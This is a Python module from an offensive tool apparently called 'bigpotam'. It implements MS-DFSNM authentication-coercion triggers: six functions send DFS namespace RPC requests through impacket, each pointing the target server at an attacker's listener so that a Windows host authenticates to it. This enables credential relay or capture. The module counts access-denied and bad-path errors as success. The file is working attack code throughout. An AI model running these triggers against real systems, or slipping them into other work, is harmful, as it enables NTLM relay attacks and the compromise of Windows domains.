"""MS-DFSNM trigger functions."""

import logging

from impacket.dcerpc.v5.dtypes import NULL

from bigpotam.paths import dfsnm_dfs_path, dfsnm_path
from bigpotam.structures import (
    NetrDfsAddRootTarget,
    NetrDfsAddStdRoot,
    NetrDfsAddStdRootForced,
    NetrDfsManagerInitialize,
    NetrDfsRemoveRootTarget,
    NetrDfsRemoveStdRoot,
)

log = logging.getLogger("bigpotam")

SUCCESS_CODES = ("rpc_s_access_denied", "ERROR_BAD_NETPATH", "RPC_S_INVALID_NET_ADDR")


def _check_success(e):
    err = str(e)
    return any(code in err for code in SUCCESS_CODES)


def trigger_add_std_root(dce, listener, listener_port=445, **kw):
    try:
        request = NetrDfsAddStdRoot()
        request["ServerName"] = dfsnm_path(listener, listener_port)
        request["RootShare"] = "test\x00"
        request["Comment"] = "test\x00"
        request["ApiFlags"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("NetrDfsAddStdRoot: %s", e)
        return False


def trigger_remove_std_root(dce, listener, listener_port=445, **kw):
    try:
        request = NetrDfsRemoveStdRoot()
        request["ServerName"] = dfsnm_path(listener, listener_port)
        request["RootShare"] = "test\x00"
        request["ApiFlags"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("NetrDfsRemoveStdRoot: %s", e)
        return False


def trigger_manager_initialize(dce, listener, listener_port=445, **kw):
    """NetrDfsManagerInitialize — SMB only, no WebDAV variant."""
    try:
        request = NetrDfsManagerInitialize()
        request["ServerName"] = f"{listener}\x00"
        request["Flags"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("NetrDfsManagerInitialize: %s", e)
        return False


def trigger_add_std_root_forced(dce, listener, listener_port=445, **kw):
    """NetrDfsAddStdRootForced — SMB only, no WebDAV variant."""
    try:
        request = NetrDfsAddStdRootForced()
        request["ServerName"] = f"{listener}\x00"
        request["RootShare"] = "test\x00"
        request["Comment"] = "test\x00"
        request["Share"] = "x:\\test\x00"
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("NetrDfsAddStdRootForced: %s", e)
        return False


def trigger_add_root_target(dce, listener, listener_port=445, **kw):
    """NetrDfsAddRootTarget — SMB only, no WebDAV variant."""
    try:
        request = NetrDfsAddRootTarget()
        request["pDfsPath"] = dfsnm_dfs_path(listener, listener_port)
        request["pTargetPath"] = NULL
        request["MajorVersion"] = 0
        request["pComment"] = "test\x00"
        request["NewNamespace"] = 0
        request["Flags"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("NetrDfsAddRootTarget: %s", e)
        return False


def trigger_remove_root_target(dce, listener, listener_port=445, **kw):
    """NetrDfsRemoveRootTarget — SMB only, no WebDAV variant."""
    try:
        request = NetrDfsRemoveRootTarget()
        request["pDfsPath"] = dfsnm_dfs_path(listener, listener_port)
        request["pTargetPath"] = NULL
        request["Flags"] = 0
        dce.request(request)
        return True
    except Exception as e:
        if _check_success(e):
            return True
        log.debug("NetrDfsRemoveRootTarget: %s", e)
        return False
